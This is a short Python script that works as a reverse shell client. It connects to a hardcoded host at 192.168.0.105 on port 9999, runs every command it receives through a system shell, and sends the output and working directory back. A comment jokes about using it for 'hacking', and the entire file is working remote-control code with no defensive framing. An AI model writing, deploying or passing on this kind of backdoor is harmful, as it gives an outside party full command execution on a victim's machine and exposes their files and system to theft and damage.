import socket
import os
import subprocess #process exit in local machine

s=socket.socket()
host="192.168.0.105"
port=9999

s.connect((host,port))  #binding host and port

while True:
	data = s.recv(1024)
	if data[:2].decode("utf-8") == 'cd':
		os.chdir(data[3:].decode("utf-8"))


	if len(data)>0:
		cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE) #access to shell commands

		output_byte=cmd.stdout.read()+cmd.stderr.read() #it combines both output 
															#and error(if any)
		output_str=str(output_byte,"utf-8")

		currentwd=os.getcwd()+'>'		#current directory
		s.send(str.encode(output_str+currentwd))

		print(output_str) #NOt required if you are hacking XD
							#or it will print in client's machine


